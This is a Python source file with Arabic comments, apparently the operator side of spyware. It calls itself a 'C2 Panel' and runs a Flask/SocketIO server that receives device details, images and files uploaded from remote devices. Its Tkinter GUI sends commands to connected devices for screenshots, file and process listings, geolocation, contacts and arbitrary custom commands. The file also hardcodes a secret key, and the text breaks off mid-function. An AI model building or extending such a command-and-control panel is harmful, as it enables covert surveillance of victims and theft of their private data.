# تكامل التطبيق المحسن

import os
import json
import datetime
import logging
import threading
import webbrowser

from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit

import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog
from PIL import Image, ImageTk

# استيراد الوحدات المحسنة
from directory_api import register_directory_routes
from remote_control_handler import RemoteControlHandler, register_remote_control_routes

# --- الإعدادات الأساسية ---
APP_ROOT = os.path.dirname(os.path.abspath(__file__))
DATA_RECEIVED_DIR = os.path.join(APP_ROOT, "received_data")
os.makedirs(DATA_RECEIVED_DIR, exist_ok=True)

# إعداد Flask و SocketIO
app = Flask(__name__)
app.config["SECRET_KEY"] = "Jk8lP1yH3rT9uV5bX2sE7qZ4oW6nD0fA"
app.config["DATA_RECEIVED_DIR"] = DATA_RECEIVED_DIR
socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode="threading",
    logger=False,
    engineio_logger=False,
)

# إعداد التسجيل
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger("C2Panel")

connected_clients_sio = {}
gui_app = None

# --- نقاط نهاية Flask API ---
@app.route("/")
def index():
    return "C2 Panel is Running. Waiting for connections..."

@app.route("/upload_initial_data", methods=["POST"])
def upload_initial_data():
    logger.info("Request to /upload_initial_data")
    try:
        json_data_str = request.form.get("json_data")
        if not json_data_str:
            logger.error("No json_data found in request.")
            return jsonify({"status": "error", "message": "Missing json_data"}), 400

        try:
            data = json.loads(json_data_str)
            device_info_summary = data.get("deviceInfo", {}).get("model", "N/A")
            logger.info(f"Received JSON (model: {device_info_summary})")
        except json.JSONDecodeError as e:
            logger.error(f"Invalid JSON received: {json_data_str[:100]}... Error: {e}")
            return jsonify({"status": "error", "message": "Invalid JSON format"}), 400

        device_info = data.get("deviceInfo", {})
        raw_device_id = data.get("deviceId", None)
        if (
            not raw_device_id
            or not isinstance(raw_device_id, str)
            or len(raw_device_id) < 5
        ):
            logger.warning(
                f"Received invalid or missing 'deviceId' from client: {raw_device_id}. Falling back."
            )
            model = device_info.get("model", "unknown_model")
            name = device_info.get("deviceName", "unknown_device")
            raw_device_id = f"{model}_{name}"

        device_id_sanitized = "".join(
            c if c.isalnum() or c in ["_", "-", "."] else "_" for c in raw_device_id
        )
        if not device_id_sanitized or device_id_sanitized.lower() in [
            "unknown_model_unknown_device",
            "_",
            "unknown_device_unknown_model",
        ]:
            device_id_sanitized = f"unidentified_device_{datetime.datetime.now().strftime('%Y%m%d%H%M%S%f')}"

        logger.info(f"Processing for Device ID (Sanitized): {device_id_sanitized}")
        device_folder_path = os.path.join(DATA_RECEIVED_DIR, device_id_sanitized)
        os.makedirs(device_folder_path, exist_ok=True)

        info_file_name = (
            f'info_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        )
        info_file_path = os.path.join(device_folder_path, info_file_name)
        with open(info_file_path, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
        logger.info(f"Saved JSON to {info_file_path}")

        image_file = request.files.get("image")
        if image_file and image_file.filename:
            filename = os.path.basename(image_file.filename)
            base, ext = os.path.splitext(filename)
            if not ext:
                ext = ".jpg"
            image_filename = (
                f"initial_img_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}{ext}"
            )
            image_path = os.path.join(device_folder_path, image_filename)
            image_file.save(image_path)
            logger.info(f"Saved image to {image_path}")
        else:
            logger.info("No image file in initial data upload or filename was empty.")

        if gui_app:
            gui_app.add_system_log(f"Initial data from: {device_id_sanitized}")
            gui_app.refresh_historical_device_list()

        return jsonify({"status": "success", "message": "Initial data received"}), 200

    except Exception as e:
        logger.error(f"Error processing /upload_initial_data: {e}", exc_info=True)
        return (
            jsonify({"status": "error", "message": f"Internal server error: {e}"}),
            500,
        )

# --- نقطة نهاية لملفات الأوامر ---
@app.route("/upload_command_file", methods=["POST"])
def upload_command_file():
    logger.info("Request to /upload_command_file")
    try:
        device_id = request.form.get("deviceId")
        command_ref = request.form.get("commandRef", "unknown_cmd_ref")

        if not device_id:
            logger.error("'deviceId' missing in command file upload.")
            return jsonify({"status": "error", "message": "Missing deviceId"}), 400

        device_id_sanitized = "".join(
            c if c.isalnum() or c in ["_", "-", "."] else "_" for c in device_id
        )
        device_folder_path = os.path.join(DATA_RECEIVED_DIR, device_id_sanitized)
        if not os.path.exists(device_folder_path):
            logger.warning(f"Device folder '{device_folder_path}' not found. Creating.")
            os.makedirs(device_folder_path, exist_ok=True)
            if gui_app:
                gui_app.refresh_historical_device_list()

        file_data = request.files.get("file")
        if file_data and file_data.filename:
            original_filename = os.path.basename(file_data.filename)
            base, ext = os.path.splitext(original_filename)
            if not ext:
                ext = ".dat"

            safe_command_ref = "".join(c if c.isalnum() else "_" for c in command_ref)
            new_filename = f"{safe_command_ref}_{base}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}{ext}"
            file_path = os.path.join(device_folder_path, new_filename)
            file_data.save(file_path)
            logger.info(
                f"Saved command file '{new_filename}' for device '{device_id_sanitized}' to {file_path}"
            )

            if gui_app:
                gui_app.add_system_log(
                    f"Received file '{new_filename}' from device '{device_id_sanitized}' (Ref: {command_ref})."
                )
                if gui_app.current_selected_historical_device_id == device_id_sanitized:
                    gui_app.display_device_details(device_id_sanitized)
            return (
                jsonify(
                    {
                        "status": "success",
                        "message": "File received by C2",
                        "filename_on_server": new_filename,
                    }
                ),
                200,
            )
        else:
            logger.error(
                "No file data in /upload_command_file request or filename empty."
            )
            return (
                jsonify({"status": "error", "message": "Missing file data in request"}),
                400,
            )

    except Exception as e:
        logger.error(f"Error processing /upload_command_file: {e}", exc_info=True)
        return (
            jsonify({"status": "error", "message": f"Internal server error: {e}"}),
            500,
        )

# --- تسجيل واجهات برمجة التطبيقات المحسنة ---
# تسجيل واجهة برمجة تطبيقات المجلدات
register_directory_routes(app)

# إنشاء وتسجيل معالج التحكم عن بعد المحسن
remote_control_handler = RemoteControlHandler(socketio, connected_clients_sio, DATA_RECEIVED_DIR)
remote_control_handler.register_handlers()
register_remote_control_routes(app, remote_control_handler)

# --- فئة واجهة المستخدم الرسومية ---
class C2PanelGUI:
    def __init__(self, master):
        self.master = master
        master.title("لوحة التحكم - v2.0")
        master.geometry("1280x800")
        master.minsize(1024, 700)

        # تحسين المظهر العام
        self.style = ttk.Style()
        try:
            self.style.theme_use("clam")
        except tk.TclError:
            logger.warning("Clam theme not available, using default.")
            self.style.theme_use("default")

        # تحسين الخطوط والألوان
        self.style.configure("Treeview.Heading", font=("Segoe UI", 10, "bold"))
        self.style.configure("TLabel", font=("Segoe UI", 9))
        self.style.configure("TButton", font=("Segoe UI", 9))
        self.style.configure(
            "TLabelframe.Label", font=("Segoe UI", 10, "bold"), foreground="#006400"
        )

        # تعريف ألوان جديدة للأجهزة المتصلة
        self.style.configure(
            "Connected.TLabel", foreground="#008000"
        )  # أخضر للأجهزة المتصلة
        self.style.configure(
            "Disconnected.TLabel", foreground="#FF0000"
        )  # أحمر للأجهزة المنفصلة

        self.current_selected_historical_device_id = None
        self.current_selected_live_client_sid = None

        # تحسين تخطيط الواجهة
        self.paned_window = ttk.PanedWindow(master, orient=tk.HORIZONTAL)
        self.paned_window.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # القسم الأيسر - قائمة الأجهزة
        self.left_pane = ttk.Frame(self.paned_window, width=400)
        self.paned_window.add(self.left_pane, weight=1)

        # تحسين قسم الأجهزة المخزنة
        hist_devices_frame = ttk.LabelFrame(self.left_pane, text="الأجهزة المسجلة")
        hist_devices_frame.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)

        # تحسين قائمة الأجهزة المخزنة
        self.hist_device_listbox = tk.Listbox(
            hist_devices_frame, height=12, exportselection=False, font=("Segoe UI", 9)
        )
        self.hist_device_listbox.pack(
            side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5
        )
        self.hist_device_listbox.bind(
            "<<ListboxSelect>>", self.on_historical_device_select
        )
        hist_scrollbar = ttk.Scrollbar(
            hist_devices_frame,
            orient=tk.VERTICAL,
            command=self.hist_device_listbox.yview,
        )
        hist_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.hist_device_listbox.config(yscrollcommand=hist_scrollbar.set)

        # تحسين قسم الأجهزة المتصلة حالياً
        live_clients_frame = ttk.LabelFrame(
            self.left_pane, text="الأجهزة المتصلة حالياً"
        )
        live_clients_frame.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)

        # تحسين قائمة الأجهزة المتصلة - استخدام عرض الشجرة بدلاً من القائمة البسيطة
        self.live_clients_tree = ttk.Treeview(
            live_clients_frame,
            columns=("name", "platform", "status", "last_seen"),
            show="headings",
            selectmode="browse",
        )
        self.live_clients_tree.heading("name", text="الاسم")
        self.live_clients_tree.heading("platform", text="النظام")
        self.live_clients_tree.heading("status", text="الحالة")
        self.live_clients_tree.heading("last_seen", text="آخر ظهور")
        
        self.live_clients_tree.column("name", width=100)
        self.live_clients_tree.column("platform", width=80)
        self.live_clients_tree.column("status", width=70)
        self.live_clients_tree.column("last_seen", width=120)
        
        self.live_clients_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.live_clients_tree.bind("<<TreeviewSelect>>", self.on_live_client_select)
        
        live_scrollbar = ttk.Scrollbar(
            live_clients_frame,
            orient=tk.VERTICAL,
            command=self.live_clients_tree.yview,
        )
        live_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.live_clients_tree.config(yscrollcommand=live_scrollbar.set)

        # القسم الأيمن - تفاصيل الجهاز والتحكم
        self.right_pane = ttk.Frame(self.paned_window)
        self.paned_window.add(self.right_pane, weight=2)

        # إنشاء دفتر تبويب للتحكم
        self.control_notebook = ttk.Notebook(self.right_pane)
        self.control_notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # تبويب تفاصيل الجهاز
        self.device_details_frame = ttk.Frame(self.control_notebook)
        self.control_notebook.add(self.device_details_frame, text="تفاصيل الجهاز")

        # تبويب الأوامر
        self.commands_frame = ttk.Frame(self.control_notebook)
        self.control_notebook.add(self.commands_frame, text="الأوامر")

        # تبويب استعراض الملفات - إضافة جديدة
        self.files_frame = ttk.Frame(self.control_notebook)
        self.control_notebook.add(self.files_frame, text="استعراض الملفات")
        
        # إعداد واجهة استعراض الملفات
        self.setup_file_browser()

        # تبويب السجلات
        self.logs_frame = ttk.Frame(self.control_notebook)
        self.control_notebook.add(self.logs_frame, text="السجلات")

        # إعداد منطقة تفاصيل الجهاز
        self.setup_device_details()

        # إعداد منطقة الأوامر
        self.setup_commands_area()

        # إعداد منطقة السجلات
        self.setup_logs_area()

        # تحديث قوائم الأجهزة
        self.refresh_historical_device_list()
        self.update_live_clients_list()

        # تعطيل أزرار الأوامر حتى يتم تحديد جهاز
        self._enable_commands(False)

    def setup_file_browser(self):
        """إعداد واجهة استعراض الملفات"""
        # إطار للتحكم في استعراض الملفات
        file_control_frame = ttk.Frame(self.files_frame)
        file_control_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # زر تحديث قائمة الملفات
        refresh_btn = ttk.Button(
            file_control_frame, 
            text="تحديث", 
            command=self.refresh_file_browser
        )
        refresh_btn.pack(side=tk.LEFT, padx=5)
        
        # زر إنشاء مجلد جديد
        new_folder_btn = ttk.Button(
            file_control_frame, 
            text="مجلد جديد", 
            command=self.create_new_folder
        )
        new_folder_btn.pack(side=tk.LEFT, padx=5)
        
        # زر حذف
        delete_btn = ttk.Button(
            file_control_frame, 
            text="حذف", 
            command=self.delete_selected_item
        )
        delete_btn.pack(side=tk.LEFT, padx=5)
        
        # زر تحميل ملف
        upload_btn = ttk.Button(
            file_control_frame, 
            text="تحميل ملف", 
            command=self.upload_file
        )
        upload_btn.pack(side=tk.LEFT, padx=5)
        
        # إطار لعرض المسار الحالي
        path_frame = ttk.Frame(self.files_frame)
        path_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(path_frame, text="المسار الحالي:").pack(side=tk.LEFT)
        
        self.current_path_var = tk.StringVar()
        self.current_path_var.set("/")
        path_entry = ttk.Entry(path_frame, textvariable=self.current_path_var, state="readonly", width=50)
        path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        # إطار لعرض محتويات المجلد
        file_list_frame = ttk.Frame(self.files_frame)
        file_list_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # عرض شجرة الملفات
        self.file_tree = ttk.Treeview(
            file_list_frame,
            columns=("type", "size", "modified"),
            show="headings",
            selectmode="browse"
        )
        self.file_tree.heading("type", text="النوع")
        self.file_tree.heading("size", text="الحجم")
        self.file_tree.heading("modified", text="تاريخ التعديل")
        
        self.file_tree.column("type", width=80)
        self.file_tree.column("size", width=100)
        self.file_tree.column("modified", width=150)
        
        self.file_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self.file_tree.bind("<Double-1>", self.on_file_double_click)
        
        file_scrollbar = ttk.Scrollbar(
            file_list_frame,
            orient=tk.VERTICAL,
            command=self.file_tree.yview
        )
        file_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.file_tree.config(yscrollcommand=file_scrollbar.set)
        
        # إطار لعرض حالة العملية
        self.file_status_var = tk.StringVar()
        self.file_status_var.set("جاهز")
        status_label = ttk.Label(self.files_frame, textvariable=self.file_status_var)
        status_label.pack(fill=tk.X, padx=5, pady=5)

    def refresh_file_browser(self):
        """تحديث عرض الملفات للمسار الحالي"""
        # هنا سيتم استدعاء واجهة برمجة التطبيقات للحصول على محتويات المجلد
        self.file_status_var.set("جاري تحديث قائمة الملفات...")
        # تنفيذ استدعاء واجهة برمجة التطبيقات هنا
        # ...
        self.file_status_var.set("تم تحديث قائمة الملفات")

    def create_new_folder(self):
        """إنشاء مجلد جديد في المسار الحالي"""
        folder_name = simpledialog.askstring("مجلد جديد", "أدخل اسم المجلد الجديد:")
        if folder_name:
            # هنا سيتم استدعاء واجهة برمجة التطبيقات لإنشاء مجلد جديد
            self.file_status_var.set(f"جاري إنشاء المجلد: {folder_name}...")
            # تنفيذ استدعاء واجهة برمجة التطبيقات هنا
            # ...
            self.file_status_var.set(f"تم إنشاء المجلد: {folder_name}")
            self.refresh_file_browser()

    def delete_selected_item(self):
        """حذف العنصر المحدد (ملف أو مجلد)"""
        selected = self.file_tree.selection()
        if selected:
            item = self.file_tree.item(selected)
            item_name = item["text"]
            if messagebox.askyesno("تأكيد الحذف", f"هل أنت متأكد من حذف {item_name}؟"):
                # هنا سيتم استدعاء واجهة برمجة التطبيقات لحذف العنصر
                self.file_status_var.set(f"جاري حذف: {item_name}...")
                # تنفيذ استدعاء واجهة برمجة التطبيقات هنا
                # ...
                self.file_status_var.set(f"تم حذف: {item_name}")
                self.refresh_file_browser()

    def upload_file(self):
        """تحميل ملف إلى المسار الحالي"""
        file_path = filedialog.askopenfilename(title="اختر ملفاً للتحميل")
        if file_path:
            file_name = os.path.basename(file_path)
            # هنا سيتم استدعاء واجهة برمجة التطبيقات لتحميل الملف
            self.file_status_var.set(f"جاري تحميل الملف: {file_name}...")
            # تنفيذ استدعاء واجهة برمجة التطبيقات هنا
            # ...
            self.file_status_var.set(f"تم تحميل الملف: {file_name}")
            self.refresh_file_browser()

    def on_file_double_click(self, event):
        """معالجة النقر المزدوج على عنصر في شجرة الملفات"""
        selected = self.file_tree.selection()
        if selected:
            item = self.file_tree.item(selected)
            item_type = item["values"][0]
            item_name = item["text"]
            
            if item_type == "مجلد":
                # الانتقال إلى المجلد
                current_path = self.current_path_var.get()
                new_path = os.path.join(current_path, item_name)
                self.current_path_var.set(new_path)
                self.refresh_file_browser()
            else:
                # عرض الملف أو تنزيله
                messagebox.showinfo("عرض الملف", f"سيتم عرض الملف: {item_name}")
                # تنفيذ استدعاء واجهة برمجة التطبيقات هنا لعرض أو تنزيل الملف
                # ...

    def setup_device_details(self):
        """إعداد منطقة تفاصيل الجهاز"""
        # إطار المعلومات الأساسية
        basic_info_frame = ttk.LabelFrame(self.device_details_frame, text="معلومات الجهاز الأساسية")
        basic_info_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # الصف الأول: معرف الجهاز والنظام
        row1 = ttk.Frame(basic_info_frame)
        row1.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(row1, text="معرف الجهاز:").grid(row=0, column=0, sticky=tk.W, padx=5)
        self.device_id_var = tk.StringVar()
        ttk.Label(row1, textvariable=self.device_id_var).grid(row=0, column=1, sticky=tk.W, padx=5)
        
        ttk.Label(row1, text="نظام التشغيل:").grid(row=0, column=2, sticky=tk.W, padx=5)
        self.device_os_var = tk.StringVar()
        ttk.Label(row1, textvariable=self.device_os_var).grid(row=0, column=3, sticky=tk.W, padx=5)
        
        # الصف الثاني: طراز الجهاز وتاريخ التسجيل
        row2 = ttk.Frame(basic_info_frame)
        row2.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(row2, text="طراز الجهاز:").grid(row=0, column=0, sticky=tk.W, padx=5)
        self.device_model_var = tk.StringVar()
        ttk.Label(row2, textvariable=self.device_model_var).grid(row=0, column=1, sticky=tk.W, padx=5)
        
        ttk.Label(row2, text="تاريخ التسجيل:").grid(row=0, column=2, sticky=tk.W, padx=5)
        self.device_reg_date_var = tk.StringVar()
        ttk.Label(row2, textvariable=self.device_reg_date_var).grid(row=0, column=3, sticky=tk.W, padx=5)
        
        # إطار الملفات المستلمة
        files_frame = ttk.LabelFrame(self.device_details_frame, text="الملفات المستلمة")
        files_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # قائمة الملفات
        self.files_listbox = tk.Listbox(files_frame, height=10, font=("Segoe UI", 9))
        self.files_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.files_listbox.bind("<Double-1>", self.on_file_select)
        
        files_scrollbar = ttk.Scrollbar(files_frame, orient=tk.VERTICAL, command=self.files_listbox.yview)
        files_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.files_listbox.config(yscrollcommand=files_scrollbar.set)
        
        # أزرار إجراءات الملفات
        files_actions_frame = ttk.Frame(files_frame)
        files_actions_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(files_actions_frame, text="فتح الملف المحدد", command=self.open_selected_file).pack(side=tk.LEFT, padx=5)
        ttk.Button(files_actions_frame, text="فتح مجلد الجهاز", command=self.open_device_folder).pack(side=tk.LEFT, padx=5)

    def setup_commands_area(self):
        """إعداد منطقة الأوامر"""
        # إطار الأوامر المتاحة
        available_commands_frame = ttk.LabelFrame(self.commands_frame, text="الأوامر المتاحة")
        available_commands_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # أزرار الأوامر الشائعة
        commands_buttons_frame = ttk.Frame(available_commands_frame)
        commands_buttons_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.cmd_get_info_btn = ttk.Button(
            commands_buttons_frame, 
            text="الحصول على معلومات الجهاز", 
            command=lambda: self.send_command("get_device_info")
        )
        self.cmd_get_info_btn.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        
        self.cmd_get_screenshot_btn = ttk.Button(
            commands_buttons_frame, 
            text="التقاط صورة للشاشة", 
            command=lambda: self.send_command("get_screenshot")
        )
        self.cmd_get_screenshot_btn.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)
        
        self.cmd_get_files_btn = ttk.Button(
            commands_buttons_frame, 
            text="قائمة الملفات", 
            command=lambda: self.send_command("list_files")
        )
        self.cmd_get_files_btn.grid(row=0, column=2, padx=5, pady=5, sticky=tk.W)
        
        self.cmd_get_processes_btn = ttk.Button(
            commands_buttons_frame, 
            text="قائمة العمليات", 
            command=lambda: self.send_command("list_processes")
        )
        self.cmd_get_processes_btn.grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
        
        self.cmd_get_location_btn = ttk.Button(
            commands_buttons_frame, 
            text="الموقع الجغرافي", 
            command=lambda: self.send_command("get_location")
        )
        self.cmd_get_location_btn.grid(row=1, column=1, padx=5, pady=5, sticky=tk.W)
        
        self.cmd_get_contacts_btn = ttk.Button(
            commands_buttons_frame, 
            text="قائمة جهات الاتصال", 
            command=lambda: self.send_command("get_contacts")
        )
        self.cmd_get_contacts_btn.grid(row=1, column=2, padx=5, pady=5, sticky=tk.W)
        
        # إطار الأمر المخصص
        custom_command_frame = ttk.LabelFrame(self.commands_frame, text="أمر مخصص")
        custom_command_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # حقل إدخال الأمر
        cmd_entry_frame = ttk.Frame(custom_command_frame)
        cmd_entry_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(cmd_entry_frame, text="اسم الأمر:").grid(row=0, column=0, sticky=tk.W, padx=5)
        self.custom_command_var = tk.StringVar()
        ttk.Entry(cmd_entry_frame, textvariable=self.custom_command_var, width=30).grid(row=0, column=1, sticky=tk.W+tk.E, padx=5)
        
        ttk.Label(cmd_entry_frame, text="المعاملات (JSON):").grid(row=1, column=0, sticky=tk.W, padx=5)
        self.custom_args_var = tk.StringVar()
        ttk.Entry(cmd_entry_frame, textvariable=self.custom_args_var, width=30).grid(row=1, column=1, sticky=tk.W+tk.E, padx=5)
        
        ttk.Button(
            cmd_entry_frame, 
            text="إرسال الأمر المخصص", 
            command=self.send_custom_command
        ).grid(row=2, column=0, columnspan=2, pady=10)
        
        # إطار نتائج الأوامر
        command_results_frame = ttk.LabelFrame(self.commands_frame, text="نتائج الأوامر")
        command_results_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # منطقة عرض النتائج
        self.command_results_text = scrolledtext.ScrolledText(
            command_results_frame, 
            wrap=tk.WORD, 
            width=40, 
            height=10,
            font=("Consolas", 9)
        )
        self.command_results_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.command_results_text.config(state=tk.DISABLED)
        
        # زر مسح النتائج
        ttk.Button(
            command_results_frame, 
            text="مسح النتائج", 
            command=self.clear_command_results
        ).pack(side=tk.RIGHT, padx=5, pady=5)

    def setup_logs_area(self):
        """إعداد منطقة السجلات"""
        # إطار سجلات النظام
        system_logs_frame = ttk.LabelFrame(self.logs_frame, text="سجلات النظام")
        system_logs_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # منطقة عرض السجلات
        self.system_logs_text = scrolledtext.ScrolledText(
            system_logs_frame, 
            wrap=tk.WORD, 
            width=40, 
            height=20,
            font=("Consolas", 9)
        )
        self.system_logs_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.system_logs_text.config(state=tk.DISABLED)
        
        # أزرار التحكم في السجلات
        logs_control_frame = ttk.Frame(system_logs_frame)
        logs_control_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(
            logs_control_frame, 
            text="مسح السجلات", 
            command=self.clear_system_logs
        ).pack(side=tk.RIGHT, padx=5)
        
        ttk.Button(
            logs_control_frame, 
            text="حفظ السجلات", 
            command=self.save_system_logs
        ).pack(side=tk.RIGHT, padx=5)

    def refresh_historical_device_list(self):
        """تحديث قائمة الأجهزة المخزنة"""
        self.hist_device_listbox.delete(0, tk.END)
        
        try:
            device_folders = [
                d for d in os.listdir(DATA_RECEIVED_DIR) 
                if os.path.isdir(os.path.join(DATA_RECEIVED_DIR, d))
            ]
            
            for device_id in sorted(device_folders):
                self.hist_device_listbox.insert(tk.END, device_id)
                
            if self.current_selected_historical_device_id:
                # إعادة تحديد الجهاز المحدد سابقاً إذا كان موجوداً
                for i, device_id in enumerate(device_folders):
                    if device_id == self.current_selected_historical_device_id:
                        self.hist_device_listbox.selection_set(i)
                        break
        except Exception as e:
            logger.error(f"Error refreshing historical device list: {e}", exc_info=True)
            messagebox.showerror("خطأ", f"حدث خطأ أثناء تحديث قائمة الأجهزة: {e}")

    def update_live_clients_list(self):
        """تحديث قائمة الأجهزة المتصلة حالياً"""
        # مسح القائمة الحالية
        for item in self.live_clients_tree.get_children():
            self.live_clients_tree.delete(item)
        
        # إضافة العملاء المتصلين
        for sid, client in connected_clients_sio.items():
            device_id = client.get("id", f"SID_{sid[:6]}")
            name_display = client.get("name_display", "غير معروف")
            platform = client.get("platform", "غير معروف")
            last_seen = client.get("last_seen", "")
            
            # تنسيق وقت آخر ظهور
            try:
                last_seen_dt = datetime.datetime.fromisoformat(last_seen)
                last_seen_str = last_seen_dt.strftime("%Y-%m-%d %H:%M:%S")
            except:
                last_seen_str = last_seen
            
            # تحديد حالة الاتصال
            status = "متصل"
            
            # إضافة العميل إلى القائمة
            self.live_clients_tree.insert(
                "", 
                tk.END, 
                iid=sid,
                values=(name_display, platform, status, last_seen_str),
                tags=("connected",)
            )
        
        # تطبيق الألوان حسب الحالة
        self.live_clients_tree.tag_configure("connected", foreground="#008000")
        
        # إعادة تحديد العميل المحدد سابقاً إذا كان موجوداً
        if self.current_selected_live_client_sid in connected_clients_sio:
            self.live_clients_tree.selection_set(self.current_selected_live_client_sid)

    def update_live_clients_list_item(self, sid):
        """تحديث عنصر محدد في قائمة الأجهزة المتصلة"""
        if sid in connected_clients_sio:
            client = connected_clients_sio[sid]
            name_display = client.get("name_display", "غير معروف")
            platform = client.get("platform", "غير معروف")
            last_seen = client.get("last_seen", "")
            
            # تنسيق وقت آخر ظهور
            try:
                last_seen_dt = datetime.datetime.fromisoformat(last_seen)
                last_seen_str = last_seen_dt.strftime("%Y-%m-%d %H:%M:%S")
            except:
                last_seen_str = last_seen
            
            # تحديد حالة الاتصال
            status = "متصل"
            
            # تحديث العنصر إذا كان موجوداً
            if sid in self.live_clients_tree.get_children():
                self.live_clients_tree.item(
                    sid, 
                    values=(name_display, platform, status, last_seen_str)
                )
            else:
                # إضافة العنصر إذا لم يكن موجوداً
                self.live_clients_tree.insert(
                    "", 
                    tk.END, 
                    iid=sid,
                    values=(name_display, platform, status, last_seen_str),
                    tags=("connected",)
                )

    def on_historical_device_select(self, event):
        """معالجة حدث تحديد جهاز من قائمة الأجهزة المخزنة"""
        selection = self.hist_device_listbox.curselection()
        if selection:
            index = selection[0]
            device_id = self.hist_device_listbox.get(index)
            self.current_selected_historical_device_id = device_id
            
            # عرض تفاصيل الجهاز
            self.display_device_details(device_id)
            
            # التحقق مما إذا كان الجهاز متصلاً حالياً
            is_connected = False
            for sid, client in connected_clients_sio.items():
                if client.get("id") == device_id:
                    is_connected = True
                    self.current_selected_live_client_sid = sid
                    self.live_clients_tree.selection_set(sid)
                    break
            
            # تمكين أو تعطيل أزرار الأوامر بناءً على حالة الاتصال
            self._enable_commands(is_connected)

    def on_live_client_select(self, event):
        """معالجة حدث تحديد جهاز من قائمة الأجهزة المتصلة"""
        selection = self.live_clients_tree.selection()
        if selection:
            sid = selection[0]
            self.current_selected_live_client_sid = sid
            
            if sid in connected_clients_sio:
                client = connected_clients_sio[sid]
                device_id = client.get("id")
                self.current_selected_historical_device_id = device_id
                
                # تحديد الجهاز في قائمة الأجهزة المخزنة
                for i, item in enumerate(self.hist_device_listbox.get(0, tk.END)):
                    if item == device_id:
                        self.hist_device_listbox.selection_clear(0, tk.END)
                        self.hist_device_listbox.selection_set(i)
                        break
                
                # عرض تفاصيل الجهاز
                self.display_device_details(device_id)
                
                # تمكين أزرار الأوامر
                self._enable_commands(True)

    def display_device_details(self, device_id):
        """عرض تفاصيل الجهاز المحدد"""
        try:
            device_folder = os.path.join(DATA_RECEIVED_DIR, device_id)
            if not os.path.exists(device_folder):
                messagebox.showerror("خطأ", f"مجلد الجهاز غير موجود: {device_id}")
                return
            
            # تحديث متغيرات معلومات الجهاز
            self.device_id_var.set(device_id)
            
            # البحث عن ملف معلومات الجهاز
            info_files = [f for f in os.listdir(device_folder) if f.startswith("info_") and f.endswith(".json")]
            if info_files:
                # استخدام أحدث ملف معلومات
                latest_info_file = sorted(info_files)[-1]
                info_path = os.path.join(device_folder, latest_info_file)
                
                with open(info_path, "r", encoding="utf-8") as f:
                    info_data = json.load(f)
                
                # استخراج معلومات الجهاز
                device_info = info_data.get("deviceInfo", {})
                self.device_os_var.set(device_info.get("os", "غير معروف"))
                self.device_model_var.set(device_info.get("model", "غير معروف"))
                
                # تاريخ التسجيل من اسم الملف
                reg_date_str = latest_info_file.replace("info_", "").replace(".json", "")
                try:
                    reg_date = datetime.datetime.strptime(reg_date_str, "%Y%m%d_%H%M%S")
                    self.device_reg_date_var.set(reg_date.strftime("%Y-%m-%d %H:%M:%S"))
                except:
                    self.device_reg_date_var.set(reg_date_str)
            else:
                # إذا لم يتم العثور على ملف معلومات
                self.device_os_var.set("غير معروف")
                self.device_model_var.set("غير معروف")
                self.device_reg_date_var.set("غير معروف")
            
            # تحديث قائمة الملفات
            self.files_listbox.delete(0, tk.END)
            files = sorted(os.listdir(device_folder))
            for file in files:
                self.files_listbox.insert(tk.END, file)
            
        except Exception as e:
            logger.error(f"Error displaying device details: {e}", exc_info=True)
            messagebox.showerror("خطأ", f"حدث خطأ أثناء عرض تفاصيل الجهاز: {e}")

    def on_file_select(self, event):
        """معالجة حدث تحديد ملف من قائمة الملفات"""
        selection = self.files_listbox.curselection()
        if selection and self.current_selected_historical_device_id:
            index = selection[0]
            filename = self.files_listbox.get(index)
            
            # عرض معلومات الملف في منطقة النتائج
            file_path = os.path.join(DATA_RECEIVED_DIR, self.current_selected_historical_device_id, filename)
            file_size = os.path.getsize(file_path)
            file_mod_time = datetime.datetime.fromtimestamp(os.path.getmtime(file_path))
            
            file_info = f"اسم الملف: {filename}\n"
            file_info += f"المسار: {file_path}\n"
            file_info += f"الحجم: {self._format_size(file_size)}\n"
            file_info += f"تاريخ التعديل: {file_mod_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
            
